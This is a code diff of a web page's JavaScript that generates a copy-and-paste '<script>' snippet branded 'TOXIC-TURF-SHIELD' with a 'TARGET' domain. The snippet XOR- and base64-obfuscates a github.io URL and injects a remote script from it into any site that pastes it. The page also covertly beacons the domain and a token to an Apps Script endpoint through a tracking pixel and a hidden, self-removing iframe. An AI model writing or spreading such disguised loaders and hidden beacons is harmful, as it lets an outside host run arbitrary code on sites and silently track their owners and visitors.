@@ -116,25 +116,27 @@
 
             const _u = "edthedog-debug";
             const _r = "secure-shield-cdn";
-            const _rawCdnUrl = `https://${_u}.github.io/${_r}/shield.min.js`;
+            const _rawCdnUrl = "https://" + _u + ".github.io/" + _r + "/shield.min.js";
 
             const _encDomain = _obfuscate(_d, _vKey);
             const _encCdn = _obfuscate(_rawCdnUrl, _vKey);
 
+            const _closeTag = '</' + 'script>';
+
             const _scriptPayload = 
-`<script>
-/* [TOXIC-TURF-SHIELD // TARGET: ${_d.toUpperCase()} // SIG: ${_tokenHex}] */
-!(function(){
-  const ${_vDomain} = decodeURIComponent(atob('${_encDomain}').split('').map(c=>String.fromCharCode(c.charCodeAt(0)^${_vKey})).join(''));
-  const ${_vCdn} = decodeURIComponent(atob('${_encCdn}').split('').map(c=>String.fromCharCode(c.charCodeAt(0)^${_vKey})).join(''));
-  const ${_vToken} = "${_tokenHex}";
-  window._TT_SIG = { domain: ${_vDomain}, token: ${_vToken} };
-  const ${_vFn} = document.createElement('script');
-  ${_vFn}.src = ${_vCdn} + "?site=" + encodeURIComponent(${_vDomain}) + "&sig=" + ${_vToken};
-  ${_vFn}.async = true;
-  document.head.appendChild(${_vFn});
-})();
-<\/script>`;
+'<script>\n' +
+'/* [TOXIC-TURF-SHIELD // TARGET: ' + _d.toUpperCase() + ' // SIG: ' + _tokenHex + '] */\n' +
+'!(function(){\n' +
+'  const ' + _vDomain + ' = decodeURIComponent(atob(\'' + _encDomain + '\').split(\'\').map(c=>String.fromCharCode(c.charCodeAt(0)^' + _vKey + ')).join(\'\'));\n' +
+'  const ' + _vCdn + ' = decodeURIComponent(atob(\'' + _encCdn + '\').split(\'\').map(c=>String.fromCharCode(c.charCodeAt(0)^' + _vKey + ')).join(\'\'));\n' +
+'  const ' + _vToken + ' = "' + _tokenHex + '";\n' +
+'  window._TT_SIG = { domain: ' + _vDomain + ', token: ' + _vToken + ' };\n' +
+'  const ' + _vFn + ' = document.createElement(\'script\');\n' +
+'  ' + _vFn + '.src = ' + _vCdn + ' + "?site=" + encodeURIComponent(' + _vDomain + ') + "&sig=" + ' + _vToken + ';\n' +
+'  ' + _vFn + '.async = true;\n' +
+'  document.head.appendChild(' + _vFn + ');\n' +
+'})();\n' +
+_closeTag;
 
             _txt.innerText = _scriptPayload;
             _box.style.display = 'block';
@@ -146,7 +148,7 @@
                     token: _tokenHex,
                     timestamp: new Date().toISOString()
                 });
-                const fullUrl = `${APPS_SCRIPT_URL}?${queryParams.toString()}`;
+                const fullUrl = APPS_SCRIPT_URL + '?' + queryParams.toString();
 
                 // Method 1: Pixel Tracker Image Object
                 const tracker = new Image();
@@ -157,7 +159,7 @@
                 iframe.style.display = 'none';
                 iframe.src = fullUrl;
                 document.body.appendChild(iframe);
-                setTimeout(() => { if (iframe.parentNode) iframe.parentNode.removeChild(iframe); }, 3000);
+                setTimeout(function() { if (iframe.parentNode) iframe.parentNode.removeChild(iframe); }, 3000);
             }
         }
     </script>
